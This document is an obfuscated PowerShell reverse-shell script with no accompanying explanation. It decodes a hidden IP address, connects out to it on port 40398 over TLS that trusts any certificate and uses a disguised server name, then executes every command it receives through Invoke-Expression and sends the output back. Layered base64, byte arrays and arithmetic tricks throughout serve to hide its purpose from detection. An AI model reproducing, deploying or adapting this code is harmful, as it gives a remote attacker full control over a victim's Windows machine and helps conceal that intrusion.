$Active = (24 - 23); 


if ($Active -ne 1) { exit }


try {
    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
    
    
    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((('T'+'VRR'+'Mk')+'x'+"$([char]0x71)$([char]0x59)$([char]0x33)$([char]0x64)$([char]0x4D)$([char]0x61)$([char]0x6B)"+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a3dU')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VQ==')))+('M0e'+'U1EV'+'T')+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MD0=')))))))));
    $port = (2 * 20199);

    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
    $NetworkStream = $TCPClient.GetStream();
    
    
    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
    $SslStream.AuthenticateAsClient(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WTJ4dg=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZFdSbWJHRnk='))),([System.Text.Encoding]::UTF8.GetString([byte[]](0x5A,0x53,0x31,0x6B,0x62,0x6E,0x4D,0x75))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WTI5dA==')))))))), $null, $sslProtocols, $false);

    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
        $SslStream.Close();
        exit;
    }

    $StreamWriter = New-Object IO.StreamWriter($SslStream);
    $StreamWriter.AutoFlush = $true;

    # Function to format the shell prompt
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
        $StreamWriter.Write($String + (([System.Text.Encoding]::UTF8.GetString([byte[]](0x50,0x53)))+$([char]0x20)) + (gl).Path + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(("$([char]0x50)$([char]0x69)"+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QQ==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PQ=='))))))));
    };

    WriteToStream '';

    
    while(($BytesRead = $SslStream.Read($Buffer, (-70 -bxor -70), $Buffer.Length)) -gt 0) {
        $Command = ([text.encoding]::UTF8).GetString($Buffer, (64 % 64), $BytesRead - 1).Trim();
        
        if ($Command -eq (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join([char]0x5A, [char]0x58, [char]0x67, [char]0x3D)))))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join([char]0x61, [char]0x51, [char]0x3D, [char]0x3D)))))+([System.Text.Encoding]::UTF8.GetString([byte[]](0x74))))) { break }
        
        $Output = try {
            Invoke-Expression $Command (25 -bxor 27)>&(14 - 13) | Out-String
        } catch {
            $_ | Out-String
        }
        
        WriteToStream ($Output);
    }

    $StreamWriter.Close();
    $TCPClient.Close();
} catch {
    
    exit;
}
